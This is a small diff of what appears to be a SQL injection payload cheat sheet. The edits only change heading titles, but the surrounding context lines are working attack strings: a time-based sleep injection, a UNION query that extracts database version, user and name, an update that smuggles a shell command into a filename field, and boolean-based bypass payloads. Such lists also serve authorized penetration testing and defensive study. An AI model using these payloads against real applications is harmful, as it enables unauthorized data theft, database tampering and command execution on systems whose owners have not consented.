@@ -49,7 +49,7 @@ ___
 1'%0a%7c%7c%0asleep(7.5)%0a--'-
 ```
 
-## SQL injection with load file and into outfile
+## SQL Injection with LOAD_FILE and INTO OUTFILE
 ```
 ' and 1=2 union all select concat_ws(0x3a,version(),user(),database())--
 
@@ -100,7 +100,7 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 
 ' union select 1,2,3,4,5 from --table_name-- - >> Union based table name retrieving.
 ```
-### Exceptional
+### Exceptional Payloads
 ```txt
 -1047 OR CASE WHEN 6810=6810 THEN 6810 ELSE JSON(CHAR(98,79,78,79)) END
 %' AND 7395=7395 AND 'gyZA%'='gyZA
